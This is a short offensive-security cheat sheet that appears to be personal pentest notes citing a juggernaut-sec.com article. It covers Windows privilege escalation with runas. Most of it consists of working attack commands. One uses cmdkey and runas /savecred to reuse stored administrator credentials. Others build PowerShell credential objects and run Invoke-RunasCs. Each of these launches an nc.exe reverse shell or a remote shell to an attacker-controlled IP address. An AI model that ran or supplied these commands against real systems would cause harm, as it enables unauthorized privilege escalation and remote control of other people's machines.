https://juggernaut-sec.com/runas/

# Method 1
%% There should be a stored password for a user! %%
```cmd
cmdkey /list
runas /env /noprofile /savecred /user:JUGG-efrost\administrator "c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
```
![[Pasted image 20240106203833.png]]


# Method 2 - Runas with Powershell
## Method 2.1
```powershell
$secpasswd = ConvertTo-SecureString "[password]" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("juggernaut.local\cmarko", $secpasswd)
Start-Process -FilePath powershell.exe -argumentlist "C:\temp\nc.exe 192.168.45.167 443 -e cmd.exe" -Credential $mycreds
```

## Method 2.2
- Download `Invoke-RunasCs.ps1`
```powershell
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command powershell.exe -Remote 10.10.13.37:1337
```


# Method 3 - GUI
If you have `RDP` access, simply run the runas command normally.
```powershell
runas /user:<domain>\<username> cmd.exe
```